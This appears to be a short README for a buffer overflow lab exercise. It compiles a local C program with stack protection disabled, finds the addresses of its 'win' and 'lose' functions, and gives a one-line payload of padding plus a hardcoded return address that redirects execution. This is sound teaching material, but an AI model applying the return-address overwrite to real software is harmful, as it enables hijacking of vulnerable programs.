
## Buffer overflow

1. The goal is to modify a path of the program to go back to `win` or `lose` function instead of `main`.

2. Compile: `gcc -Wall -Wextra -fno-stack-protector -no-pie -o main main.c`
3. Find addresses of `win` and `lose` functions:
`readelf --symbols main | grep win`

4. Create a payload:
`./main $(python3 -c 'import sys; sys.stdout.write("A"*8 + "B"*8 + "\x37\x05\x40")')`